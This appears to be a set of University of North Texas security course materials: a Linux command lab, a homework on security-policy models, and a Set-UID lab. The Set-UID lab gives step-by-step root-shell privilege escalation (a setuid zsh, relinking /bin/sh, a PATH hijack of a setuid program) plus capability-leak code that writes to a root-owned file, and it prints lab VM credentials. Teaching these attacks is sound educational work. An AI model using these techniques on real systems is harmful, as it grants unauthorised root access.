a. Type “ls –l” to display details of a directory or file: ls –l directory or file name.
Example: ls –l Desktop
b. Type “ls –la”.
Question 4: what output “ls –la” gives (take a screenshot)? What difference did you 
observe between the results of ls –l and ls –la? What is option “–a” means 
(Hint: refer to man page: “man ls” – see the man help section below – or just do the 
Internet search.)
12. mkdir - to create a directories.
a. Type “mkdir firstdir”. It creates a new directory called firstdir. You can also 
create multiple directories and also nested directories.
b. Type “mkdir dir1 dir2 dir3.” It creates 3 directories in the present directory.
c. Type “mkdir –p dir11/dir22/{dir33, dir44}”. It creates 4 directories: dir11, dir22 
inside dir11, as well as dir33 and dir44 inside dir22.
d. Type “ ls”.
13. rm - delete a file or directory.
• type “rm –r dir3”. You can also use “rmdir” but it only deletes empty directories.
14. touch - to create empty files.
• type “touch file1 file2 file3”.
15. mv - to move or rename files and directories.
a. type mv file1 dir1. This moves (cuts and pastes) the file file1 to the directory dir1.
b. type mv file2 file22.
c. Type “ls”.
16. cp - copy files and directories.
Type the following commands in the below order.
“touch file4” - creates a file file4.
“mkdir dir4” - creates a directory dir4.
“cp file4 dir4” - copies file4 to dir4.
“mkdir dir5” - creates another directory dir5.
SECURITY LAB - [SELECT DATE] 10
“cp –r dir4 dir5” .Copies dir4 to dir5
Question 5: Why do we have to use “-r” option to copy directories (Hint use man cp)?
17. find- to find files and directories.
• Type “find /root –name file1.”
Question 6: What is the result?
You are searching for file called file1 in directory /root. This command will search for the 
file in /root and in all its sub directories. You gave /root as search location as you think 
file1 must be somewhere in it. You are totally clueless where the might be on file system, 
you should start searching for it from top most directory in file-system, i.e /. the command 
would be find / -name file1
Absolute and relative path
18. The absolute path of a file or directory is its path written from the root of the file system. 
For example, consider the directory dir44 you created earlier in Step 5. Its absolute path is 
/home/username/dir11/dir22/dir44. 
19. Relative path of file or directory is its path from the current directory. Now you are in your 
home directory which is /home/username. The relative path of dir44 from this directory is 
dir11/dir22/dir44. You start writing relative path from directory directly below i.e. dir11
20. You can a file or directory either using relative path or absolute path
• Type “touch /home/username/dir11/dir22/dir44/file44”.(Replace username you 
actual username).
• Type “dir11dir22/dir44/file55”
Either way you are able can access dir44 
Note: Relative path only makes sense if the object you are accessing below your current directory. 
Else you have to use the Absolute path. For example, you have to access /etc/wireshark/init.lua 
file, you don’t have any relative path to it from your home directory. But you can use a relative 
path you are in / or /etc.
File Compression and archiving
21. To compress and archive files: In Linux file compression and archiving (grouping file 
together) and compression are two different activities. First, we archive multiple files with 
“tar” command. A file with “.tar” extension is created. Then we zip (compress the file) 
with gzip command. (gzip-stands for gunzip is compression tool in linux. Bunzip (bzip2) 
and zip are other commonly used compression tools)
a. Type “touch a b c d”. Creates 4 files a, b, c and d
b. tar –cf compressed.tar a b c d. We are creating a tar file compressed.tar from 
files a b c and d
SECURITY LAB - [SELECT DATE] 11
c. gzip –vf compressed.tar. This should create a file compressed.tar.gz
Note: For “tar” command, you should supply output filename along with .tar 
extension. For gzip, it automatically creates a zipped file with .gz extension. You 
no longer have .tar file after you compress it with gzip.
d. You can also do it in single step which is usually the preferred way: 
type “tar –zcvf compressed2.tar.gz a b c d”. 
22. To extract and uncompress files
a. Type “rm –rf a b c d”. Deleting the files
b. Type “ls”
c. Type “gzip –dvf compressed.tar.gz”-you’ll get compressed.tar file
d. Type “tar –xvf compessed.tar”. You’ll get original files a, b, c and d
e. type “ls”
f. You can just uncompress and extract the compressed2.tar.gz in a sigle step:
g. Type “tar –zxvf compressed2.tar.gz”
Getting help- the “man” command:
“man” command is used to get help for any command in Linux. man stands for manual. To pull 
up a man page of a command, type man command. Ex: man ls. This command displays list of 
options available with the command. Man pages explain different options and syntax of a 
command and are usually difficult to understand for beginners. If you want to know usage and 
example for a command, google is the best place to look. 
Type “q” to quit from man page.
File Permissions and Access Control
In Linux a file has read, write and execute permissions. And permissions are assigned to 
users of three categories: owner, group and others. The user who creates a file will be the 
owner, group is group of users who has access. Others are all the users other than owner
and users in the group
1. Understanding file/directory permissions:
Type ls –l filename to list file permissions.
SECURITY LAB - [SELECT DATE] 12
Below illustration explains various fields of a file details printed
Each file (and directory) has associated access rights, which may be found by typing ls -l. 
Also, ls -lg gives additional information as to which group owns the file (beng95 in the 
following example): 
-rwxrw-r-- 1 ee51ab beng95 2450 Sept29 11:52 file1
In the left-hand column is a 10 symbol string consisting of the symbols d, r, w, x, -, and, 
occasionally, s or S. If d is present, it will be at the left hand end of the string, and indicates 
a directory: otherwise - will be the starting symbol of the string.
The 9 remaining symbols indicate the permissions, or access rights, and are taken as three 
groups of 3. 
• The left group of 3 gives the file permissions for the user that owns the file (or 
directory) (ee51ab in the above example); 
• the middle group gives the permissions for the group of people to whom the file (or 
directory) belongs (eebeng95 in the above example); For every user in Linux,a 
group with the same name is also created. This group will be default group on newly 
created files. 
• the rightmost group gives the permissions for all others.
The symbols r, w, etc., have slightly different meanings depending on whether they refer 
to a simple file or to a directory. 
2. Access rights on files.
• r (or -), indicates read permission (or otherwise), that is, the presence or absence of 
permission to read and copy the file 
• w (or -), indicates write permission (or otherwise), that is, the permission (or 
otherwise) to change a file 
• x (or -), indicates execution permission (or otherwise), that is, the permission to 
execute a file, where appropriate 
SECURITY LAB - [SELECT DATE] 13
3. Access rights on directories.
• r allows users to list files in the directory; 
• w means that users may delete files from the directory or move files into it; 
• x means the right to access files in the directory. This implies that you may read 
files in the directory provided you have read permission on the individual files. 
• So, in order to read a file, you must have executed permission on the directory 
containing that file, and hence on any directory containing that directory as a 
subdirectory, and so on, up the tree. 
Some examples
-rwxrwxrwx a file that everyone can read, write and execute (and delete).
-rw-------
a file that only the owner can read and write - no-one else 
can read or write and no-one has execution rights (e.g. your 
mailbox file).
4. Changing access rights(permisions) on a file
a. chmod (changing a file mode):
i. Only the owner of a file can use chmod to change the permissions of a 
file. The options of chmod are as follows 
Symbol Meaning
u user
g group
o other
a all
r read
w write (and delete)
x execute (and access directory) 
+ add permission
- take away permission
ii. type “touch access” (to create a file called access)
iii. type “ls –l access”
iv. To remove read write and execute permissions on the file access for the 
group and others
type “sudo chmod go-rwx access”. This will leave the other 
permissions unaffected. 
v. To give read and write permissions on the file access to all, 
Type “sudo chmod a+rw access”
b. chgrp-this command is used to change the group of a file
i. Type “sudo chgrp bob access”. This will change the default group on 
file “access” to bob from your username. 
ii. Type “ls –l access”
SECURITY LAB - [SELECT DATE] 14
c. chown- this command is used change ownership of a file or directory. This can 
also be used to change the group like chgrp.
i. Type “touch own_file”
ii. Type “ls –l own_file”
iii. Type “sudo chown bob own_file”. This change owner of the file to bob 
from you.
iv. Type “mkdir own_dir”
v. Type “ls –ld own_dir”. The –ld option displays properties of directory. 
If you only use –l it shows properties of contents of own_dir.
vi. Type “sudo chown bob:bob own_dir” .This change both owner and 
group to bob on folder own_dir. 
vii. Type “ls –ld own_dir”
 Question 7: Submit a screen shot of terminal
Note that chown only change owner of directory but not its contents. To change 
ownership of files and directories within own_dir, along with is permissions use 
chown with “–R” option.
Ex: “sudo chown –R bob:bob own_dir”
Installing Software
1. To install a software package apt-get command is used in Ubuntu Linux.
• Type “sudo apt-get update”
• Type “sudo apt-get install chromium”
(if this does not work, use “sudo apt-get install chromium-browser”.)
It checks for file size to be downloaded and ask for confirmation. Type “y” and hit enter. 
This command installs Chromium web browser.
Question 8: Take a screenshot of the notification that installation is complete.
If you don’t know the exact name of the package you can search for it with “apt-cache” 
command
Ex: apt-cache search openoffice. Relevant packages will be shown.
2. Installing software From GUI
You can also install software using “Add or Remove” utility. 
Click Applications->Click System Tools->Select Add or Remove Software
3. To download a file from internet use wget command
Type 
wget https://kekeseen.files.wordpress.com/2013/03/linux_commands_08.pdf
This will down the pdf file. Similarly, you can down load file from web page if its URL is 
known.
SECURITY LAB - [SELECT DATE] 15
Text Editors-Nano & Vim
Nano:
a. To open a file in nano:
Type “nano newfile”. This will open a blank file called newfile.
If there is already a file by name newfile nano will open that. Only if there exists 
no file by the name supplied it opens a new blank file with the supplied name.
b. To edit and save
To write data to file, move cursor with arrow keys to location where you want to 
add content and start writing. Delete content using backspace.
Press Ctrl+O, it ask for confirmation: File name to write: newfile. Hit Enter.
c. To exit nano
Press Ctrl+X
d. To search for a string or keyword
Press Ctrl+W. A search: prompt appears at the bottom, type keyword you want to 
search and press enter.
Note: You have all the above explained controls at the bottom of the nano editor 
with brief description
1. VI Editor: 
VI Editor has 2 different modes: Command Mode and Insert Mode.
a. Command mode:
Type: “vi blankfile”. This opens a new file-blank file if a file doesn’t exist by the 
name. A file is opened into command mode by default. In this mode you can issue 
commands to edit text. 
b. Insert mode:
Hit letter “i”, which moves to insert mode from command mode. You can edit, add 
content to the file in this mode. Use arrow keys to navigate, backspace to delete.
To save changes to the file: 
SECURITY LAB - [SELECT DATE] 16
i. Press Escape key-it takes file back to command mode.
ii. Press ""Shift + :” A : prompt is created at bottom of file.
iii. Type letter “w”-it saves your file
Note: If you don’t want save the file at this point but want to go back , 
hit escape-to go to command mode and then “i” to go to insert mode. 
You always have to be in command mode before you go to insert mode.
iv. Again Press ""Shift + :”- and type “q” to exit vi editor. If file has 
unsaved modifications, vi asks for confirmation. Typing q! Forcefully 
quits without saving.
c. More about Command mode: This mode takes commands from key board, to do 
operation like copy, paste, cut delete, etc. You can navigate using arrow keys.
a. dd-delete current line (in which cursor is present). ndd –deletes n number 
of lines. Ex: 5dd
b. yy-copy current line (in which cursor is present). nyy- copies n number of 
lines.
c. p-paste copied line(s) below current line
2. To print content of text file to terminal
a. Type “cat newfile”. It will dump all the content in newfile to terminal.
b. Type “less newfile”. This will open newfile on terminal but only partially display 
its content. Press enter to browse the file one line at a time. Press Q to exit less.
There are many other text editors like emacs, pico etc, but we limit our demonstration to nano 
and vi. There are many GUI test editors as well. Some of them are mentioned in the Kali Linux 
Intro section.
List of Useful commands
This is not an exhaustive list of commands. But this list covers most of the commands which are 
regularly used.
Note: Always use the command “man” to view a command’s manual pages. The command’s 
manual page gives a complete list of functional usage of a command. 
a
 alias Create an alias of a command 
 apropos Search Help manual pages (man -k)
 apt-get Search for and install software packages (Debian/Ubuntu for Centos use yum)
 aptitude Search for and install software packages (Debian/Ubuntu)
 aspell Spell Checker
 awk Find and Replace text, database sort/validate/index
b
 basename Strip directory and suffix from filenames
 bash GNU Bourne-Again SHell 
 bc Arbitrary precision calculator language 
 bg Send to background
 break Exit from a loop •
 builtin Run a shell builtin
 bzip2 Compress or decompress named file(s)
SECURITY LAB
- [SELECT DATE] 17
c
 cal Display a calendar
 case Conditionally perform a command
 cat Concatenate and print (display) the content of files
 cd Change Directory
 cfdisk Partition table manipulator for Linux
 chgrp Change group ownership
 chmod Change access permissions
 chown Change file owner and group
chroot Run a command with a different root directory
 chkconfig System services (runlevel)
 
cksum Print CRC checksum and byte counts
 clear Clear terminal screen
 cmp Compare two files
 comm Compare two sorted files line by line
 command Run a command 
- ignoring shell functions •
 continue Resume the next iteration of a loop •
 cp Copy one or more files to another location
 cron Daemon to execute scheduled commands
 crontab Schedule a command to run at a later time
 csplit Split a file into context
-determined pieces
 cut Divide a file into several parts d
 date Display or change the date & time
 dc Desk Calculator
 dd Convert and copy a file, write disk headers, boot records
 ddrescue Data recovery tool
 declare Declare variables and give them attributes •
 df Display free disk space
 diff Display the differences between two files
 diff3 Show differences among three files
 dig DNS lookup
 dir Briefly list directory contents
 dircolors Colour setup for `ls'
 dirname Convert a full pathname to just a path
 dirs Display list of remembered directories
 dmesg Print kernel & driver messages 
 du Estimate file space usage e
 echo Display message on screen •
 egrep Search file(s) for lines that match an extended expression
 eject Eject removable media
 enable Enable and disable builtin shell commands •
 env Environment variables
 ethtool Ethernet card settings
 eval Evaluate several commands/arguments
 exec Execute a command
 exit Exit the shell
 expect Automate arbitrary applications accessed over a terminal
SECURITY LAB
- [SELECT DATE] 18
 expand Convert tabs to spaces
 export Set an environment variable
 expr Evaluate expressions f
 false Do nothing, unsuccessfully
 fdformat Low
-level format a floppy disk
 fdisk Partition table manipulator for Linux
 fg Send job to foreground 
 fgrep Search file(s) for lines that match a fixed string
 file Determine file type
 find Search for files that meet a desired criteria
 fmt Reformat paragraph text
 fold Wrap text to fit a specified width.
 for Expand words, and execute commands
 format Format disks or tapes
 free Display memory usage
 fsck File system consistency check and repair
 ftp File Transfer Protocol
 function Define Function Macros
 fuser Identify/kill the process that is accessing a file g
 gawk Find and Replace text within file(s)
 getopts Parse positional parameters
 grep Search file(s) for lines that match a given pattern
 groupadd Add a user security group
 groupdel Delete a group
 groupmod Modify a group
 groups Print group names a user is in
 gzip Compress or decompress named file(s) h
 hash Remember the full pathname of a name argument
 head Output the first part of file(s)
 help Display help for a built
-in command •
 history Command History
 hostname Print or set system name i
 iconv Convert the character set of a file
 id Print user and group id's
 if Conditionally perform a command
 ifconfig Configure a network interface
 ifdown Stop a network interface 
 ifup Start a network interface up
 import Capture an X server screen and save the image to file
 install Copy files and set attributes j
 jobs List active jobs •
 join Join lines on a common field k
 kill Stop a process from running
SECURITY LAB
- [SELECT DATE] 19
 killall Kill processes by name l
 less Display output one screen at a time
 let Perform arithmetic on shell variables •
 link Create a link to a file 
 ln Create a symbolic link to a file
 local Create variables •
 locate Find files
 logname Print current login name
 logout Exit a login shell •
 look Display lines beginning with a given string
 lpc Line printer control program
 lpr Off line print
 lprint Print a file
 lprintd Abort a print job
 lprintq List the print queue
 lprm Remove jobs from the print queue
 ls List information about file(s)
 lsof List open files m
 
make Recompile a group of programs
 man Help manual
 mkdir Create new folder(s)
 mkfifo Make FIFOs (named pipes)
 mkisofs Create an hybrid ISO9660/JOLIET/HFS filesystem
 mknod Make block or character special files
 more Display output one screen at a time
 mount Mount a file system
 mtools Manipulate MS
-DOS files
 mtr Network diagnostics (traceroute/ping)
 mv Move or rename files or directories
 mmv Mass Move and rename (files) n
 netstat Networking information
 nice Set the priority of a command or job
 nl Number lines and write files
 nohup Run a command immune to hangups
 notify
-send Send desktop notifications
 nslookup Query Internet name servers interactively o
 open Open a file in its default application
 op Operator access p
 passwd Modify a user password
 paste Merge lines of files
 pathchk Check file name portability
 ping Test a network connection
 pkill Stop processes from running
 popd Restore the previous value of the current directory
SECURITY LAB
- [SELECT DATE] 20
 pr Prepare files for printing
 printcap Printer capability database
 printenv Print environment variables
 printf Format and print data •
 ps Process status
 pushd Save and then change the current directory
 pv Monitor the progress of data through a pipe 
 pwd Print Working Directory q
 quota Display disk usage and limits
 quotacheck Scan a file system for disk usage
 quotactl Set disk quotas r
 ram ram disk device
 rcp Copy files between two machines
 read Read a line from standard input •
 readarray Read from stdin into an array variable •
 readonly Mark variables/functions as readonly
 reboot Reboot the system
 rename Rename files
 renice Alter priority of running processes 
 remsync Synchronize remote files via email
 return Exit a shell function
 rev Reverse lines of a file
 rm Remove files
 rmdir Remove folder(s)
 rsync Remote file copy (Synchronize file trees) s
 screen Multiplex terminal, run remote shells via ssh
 scp Secure copy (remote file copy)
 sdiff Merge two files interactively
 sed Stream Editor
 select Accept keyboard input
 seq Print numeric sequences
 set Manipulate shell variables and functions
 sftp Secure File Transfer Program
 shift Shift positional parameters
 shopt Shell Options
 shutdown Shutdown or restart linux
 sleep Delay for a specified time
 slocate Find files
 sort Sort text files
 source Run commands from a file '.'
 split Split a file into fixed
-size pieces
 ssh Secure Shell client (remote login program)
 strace Trace system calls and signals
 su Substitute user identity
 sudo Execute a command as another user
 sum Print a checksum for a file
SECURITY LAB - [SELECT DATE] 21
 suspend Suspend execution of this shell •
 sync Synchronize data on disk with memory
t
 tail Output the last part of file
 tar Store, list or extract files in an archive
 tee Redirect output to multiple files
 test Evaluate a conditional expression
 time Measure Program running time
 timeout Run a command with a time limit
 times User and system times
 touch Change file timestamps
 top List processes running on the system
 traceroute Trace Route to Host
 trap Run a command when a signal is set(bourne)
 tr Translate, squeeze, and/or delete characters
 true Do nothing, successfully
 tsort Topological sort
 tty Print filename of terminal on stdin
 type Describe a command •
u
 ulimit Limit user resources •
 umask Users file creation mask
 umount Unmount a device
 unalias Remove an alias •
 uname Print system information
 unexpand Convert spaces to tabs
 uniq Uniquify files
 units Convert units from one scale to another
 unset Remove variable or function names
 unshar Unpack shell archive scripts
 until Execute commands (until error)
 uptime Show uptime
 useradd Create new user account
 userdel Delete a user account
 usermod Modify user account
 users List users currently logged in
 uuencode Encode a binary file 
 uudecode Decode a file created by uuencode
v
 v Verbosely list directory contents (`ls -l -b')
 vdir Verbosely list directory contents (`ls -l -b')
 vi Text Editor
 vmstat Report virtual memory statistics
w
 wait Wait for a process to complete •
 watch Execute/display a program periodically
 wc Print byte, word, and line counts
 whereis Search the user's $path, man pages and source files for a program
 which Search the user's $path for a program file
SECURITY LAB - [SELECT DATE] 22
 while Execute commands
 who Print all usernames currently logged in
 whoami Print the current user id and name (`id -un')
 wget Retrieve web pages or files via HTTP, HTTPS or FTP
 write Send a message to another user 
x
 xargs Execute utility, passing constructed argument list(s)
 xdg-open Open a file or URL in the user's preferred application.
 yes Print a string until interrupted
 zip Package and compress (archive) files.
 . Run a command script in the current shell
 !! Run the last command again
 # Comment / Remark
 // Comment / Remark"
"['canvas chapters', 'introduction to computer', 'access', 'form of submission', 'security policies', 'confidential', 'top secret', 'computer system', 'faculty', 'staff', 'text document', 'secret', 'computer security', 'united airlines company', 'security', 'united airlines', 'system', 'computer', 'security labels', 'label', 'document classified', 'company groups', 'company group', 'students', 'company']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Security Policies,Homework,"Homework 3
Due: 11:59 PM on Tuesday, March 1, 2022
Form of submission: PDF, Word, or Text Document in Canvas
					
Chapters 4 to 7 – Security Policies (Introduction to Computer Security, Bishop)
⦁	(20 Points) Consider a computer system that provides protection using the Bell-LaPadula policy. How would a virus spread if:
⦁	the virus were placed on the system at system low (the compartment that all other compartments dominate)?



⦁	the virus were placed on the system at system high (the compartment that dominates all other compartments)?



⦁	(20 points) Construct the following lattices:
⦁	A Bell-LaPadula lattice consisting of two secrecy levels (Unclassified and Confidential, where Unclassified < Confidential) and two categories (Hertz and Avis).  The highest secrecy node should be the upper bound of the lattice. Regarding categories, the categories are defined to be separate organizations in which confinement of data to be desired. For example, a person with only Confidential rights in Hertz would not have access to even Unclassified data in Avis. Of course, you could have people with rights in both categories as well as objects that belong to both categories.



⦁	A Biba lattice consisting of two integrity levels (High and Low) and two categories (Ford and GM). The highest integrity node should be the upper bound of the lattice.





⦁	(15 points) Consider a system that combines the Military security policy and Bell-LaPadula confidentiality model. Given the security levels TOP SECRET, SECRET, CONFIDENTIAL, and UNCLASSIFIED (ordered from highest to lowest), and compartments Students, Faculty, Staff, and Contractors specify what type of access (read, write, both, none) is allowed in each of the following situations.
⦁	John, cleared for (TOP SECRET, {Faculty, Staff, Students}), wants to access a document classified as (TOP SECRET, {Faculty, Staff, Contractors}).

⦁	Bill, cleared for (CONFIDENTIAL, {Faculty, Students}), wants to access a document classified as  (CONFIDENTIAL, {Students})

⦁	Janet, cleared for (SECRET, {Faculty, Students}), wants to access document classified as (CONFIDENTIAL, {Faculty}).

⦁	Pete, cleared for (CONFIDENTIAL, {Faculty, Staff}), wants to access a document classified as (SECRET, {Staff}).

⦁	Chris, cleared for (CONFIDENTIAL, {Staff}) wants to access a document classified as (UNCLASSIFIED, {Staff}).

⦁	(15 points) The conflict class ""Airlines"" contains the following company groups: Delta, United Airlines, American Airlines, and US Airways. The second conflict class ""Hotels"" contains the company groups: Holiday Inn, Inter Continental, Best Western, and Double Tree. Would the following scenarios be allowed under what conditions using the Chinese Wall security policy with regards to the type of access (read, write, both, none)?
⦁	Tom has had access to Delta company group. Tom wants to get access to United Airlines company group.

⦁	Bob has had access to Delta. Bob wants to get access to Holiday Inn company group.

⦁	Jim wants to get access to Delta and United Airlines company groups.

⦁	John wants to get access to Delta and Inter Continental company groups.

⦁	A new hire, Ann, wants to get access to Double Tree company group.
 
⦁	(16 points) Consider the following lattice of security labels in which all data is labeled with one of the following four security labels (the higher the label, the more confidential the information):
 
Consider the following program snippet that calculates the results for output variables a, b, c, and d based on the values of input variables q, r, s, and t:
…
a = s + t;
if (q > 0)
{
	b = 1;
	if (r > 0)
	{
		c = 1;
	}
}
else
{
	d = 1;
}
…
The input variables are initially assigned the following security labels (and cannot be changed):
⦁	Label of q = Restricted (R)
⦁	Label of r = Secret (S)
⦁	Label of s = Confidential (C)
⦁	Label of t = Public (P)
For each output variables a, b, c, and d, determine the minimal security label that can be assigned so that the code shown is secure according to the Bell-LaPadula model. To give you a good start, you are really only concerned with the ""reads"" and ""writes"", specifically with regard to up and down according to the model. You may assume that all output variables are initially set to the Public security label and that discretionary read/write access is available where applicable. You must justify your results for full credit.





⦁	(14 points) Suppose you are designing a high integrity system. Which integrity model (Biba or Clark-Wilson) would you select to provide the best guidance? Justify your answer.

"
"['set-uid vulnerabilities', 'set-uid', 'bin', 'program', 'shell', 'root', 'set-uid program', 'lab', 'shell program', 'user', 'vulnerabilities', 'zsh', 'path', 'set-uid programs', 'path environment variable', 'csce', 'fall', 'file', 'setuid', 'set-uid program lab', 'set-uid shell programs', 'root shell', 'root privileges', 'attach', 'path environment']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Set-UID Vulnerabilities 1,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
Lab 3b: Set-UID Vulnerabilities
In this lab, you will be using the same Ubuntu 20 VM as in Lab 3a. 
The credentials are: 
Username: sec-lab
Password: untccdc
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program 
(executable) is run, it assumes the owner's privileges. For example, if the program's owner is root, then 
it gains the root's privileges during its execution, no matter who runs it. 
Set-UID allows ordinary users to gain access to many important functionalities, but unfortunately, it is 
also the source of many vulnerabilities. 
The objectives of this lab are to let the students:
(1) Appreciate its positive side: to understand why Set-UID is needed and how it is implemented.
(2) Become aware of its negative side: to understand potential security problems that it may cause.
Note: This is an exploration lab. Your main task is to “play” with the Set-UID mechanism in Linux. 
Please refer to the Lab 0 manual for the basic Linux commands. For information on working with 
umask, see, e.g., the following: https://www.linuxnix.com/umask-define-linuxunix/ 
Q1: Answer why passwd, chsh, su, and sudo commands need to be Set-UID programs.
What will happen if they are not? 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
Note: If you are not familiar with these commands, you should first learn about them by reading their 
manuals (e.g., man su, man chsh, etc.).
Section 1: Shell Protection Mechanism
In this section, you will run several Set-UID shell programs in Linux, and then describe and explain 
your observations.
a. Login as root.
1. apt-get update
2. apt-get install zsh
3. Copy /bin/zsh to /tmp:
cp /bin/zsh /tmp
and make the copied file \tmp\zsh a Set-UID program with permission 4755:
chmod 4755
4. cd /tmp
5. ls -la // to see the permission change 
b. Add a new user.
1. adduser bob
2. Enter your password.
3. Next, enter the password of the new user “bob”, after pressing “Enter”, complete the user 
details.
4. su bob
c. Then login as a normal user, and run the Z shell (zsh).
1. ./zsh // this is to run the “zsh” shell
Notice: the hostname is now “ubuntu” or “unt-sec”
2. pwd // see that your current folder; it to should be /tmp 
3. cd /root // change directory to the “root” folder
4. pwd // notice that you entered the “root” folder while you are not root, 
// i.e., you have superuser privileges 
5. exit // to leave the Z shell
d. Perform the same steps as in the above Item (a) for bash:
Instead of copying /bin/zsh, copy /bin/bash to /tmp. Make it a setuid program with permission 
4755. Run /tmp/bash as a normal user. Try to change to the root directory.
Q2: Can you get access to the root privilege?
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
As you (hopefully) saw in the previous step, the bash shell has a built-in protection which prevents 
an abuse of the Set-UID mechanism. Basically, if bash detects that it is executed in a Set-UID 
process, it changes its effective user ID to the process’ real user ID, hence dropping the privileges. 
In order to understand the issues, which arise when such the protection is not implemented, we are 
going to use a different shell program called /bin/zsh. 
In some Linux distributions (such as Fedora and Ubuntu), /bin/sh is actually a symbolic link to 
/bin/bash. In the following section, we will intentionally use the vulnerable Z shell. For that, we 
need to link the default shell /bin/sh to /bin/zsh using the following instructions:
• sudo su
(enter the root password)
• cd /bin
• rm -rf sh // to remove the original sh shell
• ln -s zsh sh // to create a symbolic link of the vulnerable zsh shell to be sh.
Q3: Attach a screenshot of the result.
Section 2: PATH Environment Variable
The “system” (const char *cmd) library function can be used to execute a command within a program. 
The way “system” works is to invoke the default shell (/bin/sh) program, and then let the shell program 
execute the command “cmd”. Since the shell program is invoked, calling system() within a Set-UID 
program is dangerous, because behavior of the shell program can be affected, e.g., by environment 
variables, such as PATH. The problem is that these environment variables are under user’s control. 
By changing them, attackers (malicious users) can control behavior of Set-UID programs. One can 
change the PATH environment variable in the following way (this example adds the directory 
/home/sec-lab to the beginning of the PATH environment variable):
• export PATH=/home/sec-lab:$PATH
The Set-UID program below is supposed to execute the “ls” command (absolute path: /bin/ls).
However, let us see what happens if the programmer uses the relative path for the “ls” command, rather 
than the absolute path.
A. Create a file: 
a) nano setUID.c
b) copy the following code to the file:
#include <stdio.h >
int main()
{
 system(""ls"");
 return 0;
}
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
c) gcc -o setUID setUID.c // This is to compile the code.
Q4: Attach a screenshot of the result.
d) sudo chmod 4755 setUID
e) ./setUID // Execute the file.
Q5: Attach a screenshot of the result. (Notice the output.)
Next, we will use the setUID executable to let a regular user “sec-lab” get access to the root shell.
Note: Make sure that you are running the following steps as a user “sec-lab”. 
First, we copy the shell program /bin/sh to our home directory /home/sec-lab/ also renaming it as 
“ls”:
f) cp /bin/sh /home/sec-lab/ls
Run setUID again:
g) ./setUID
As you can see, we got the root shell. Let us confirm it by accessing the root directory:
h) cd /root
Q6: Attach a screenshot of the result. Explain why you were able to get the root shell.
i) Now, change the default shell /bin/sh so it points back to /bin/bash.
 (You will need to use “sudo” to make changes to the “/bin” directory.)
cd /bin/
rm -rf sh
ln -s bash sh
j) Repeat the above steps (f)-(h). 
Q7: Attach a screenshot of the result.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
Section 3: Capability leaking
To be more secure, Set-UID programs usually call setuid() system call to permanently relinquish their 
root privileges. However, sometimes, this is not enough. When a privileged process transitions to 
a non-privileged process, one of the common problems that may occur is the so called “capability 
leaking”. Suppose that the process gained some capabilities when it was privileged. 
When the privileges are downgraded, if the program does not properly clean up these capabilities, 
they may still be accessible by the non-privileged processes.
For example, after a file is opened, its file descriptor is created, and the latter represents a form of 
capability, because whoever carries it is able of accessing the corresponding file.
Suppose that a program relinquishes the process’ capability by calling setuid(), but “forgets” to close 
the file. Then, its descriptor represents a “leaked” capability.
NOTE: Before starting to work on this task, make sure that /bin/sh is linked to /bin/zsh:
• cd /bin/
• rm –rf sh
• ln -s zsh sh
Assume that /etc/zzz is an important system file, and it is owned by root with permission 0644.
Compile the following program, and make it set-root-uid.
• Login as root using “sudo su”.
• touch /etc/zzz
• echo “Important Configuration” > /etc/zzz
• Copy-paste your program into a file hack2.c (see its source below).
• gcc -o hack2 hack2.c
• chmod 4755 hack2
• exit // Make sure that you are now a normal user.
• ./hack2 // When executing the code, you should be a normal user.
• cat /etc/zzz
Q8: Provide a screenshot of the results. Was the file /etc/zzz modified or not?
Explain your observations.
#include <stdio.h>
#include <stdlib.h>
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
void main()
{
int fd;
fd = open(""/etc/zzz"", O_RDWR | O_APPEND);
if (fd == -1)
{
printf(""Cannot open /etc/zzz\n"");
exit(0);
}
/* Simulate the tasks conducted by the program */
sleep(1);
/* After the task, the root privileges are no longer needed; it is time to relinquish the root 
privileges permanently. */
setuid(getuid()); /* getuid() returns the real uid */
if (fork())
{ 
/* In the parent process */
close (fd);
exit(0);
} else { 
/* in the child process */
/* Now, assume that the child process is compromised, malicious attackers have injected 
the following statements into this process */
write (fd, ""Malicious Data\n"", 15);
close (fd);
}
}
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: Set-UID Vulnerabilities
References
Wenliang Du, “Set-UID Privileged Programs” Lecture Notes of CIS/CSE 643: Computer Security, 
Syracuse University
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf
The SET-UID man page 
http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Vulnerability/Set-UID/files/setuid.pdf
How to write a SETUID Program
http://nob.cs.ucdavis.edu/~bishop/secprog/1987-sproglogin.pdf
Wenliang Du, “Computer & Internet Security – A Hands-on Approach”, 2nd ed., 2019.
Wenliang Du, Environment Variable and Set-UID Program Lab:
https://seedsecuritylabs.org/Labs_20.04/Files/Environment_Variable_and_SetUID/Environment_Varia
ble_and_SetUID.pdf"
"['file', 'root', 'program', 'user', 'home', 'ova file cscelab.ova', 'bin', 'set', 'set-uid root program', 'root user', 'command', 'ova file', 'commands', 'provide a screenshot', 'set-uid', 'link', 'permissions', 'provide', 'users', 'system', 'directory', 'screenshot', 'bit', 'make', 'set-uid program']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Set-UID Vulnerabilities 2,Lab,"Lab 3:
Set-UID Vulnerabilities Lab
This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: 
Username: sec-lab
Password: untccdc
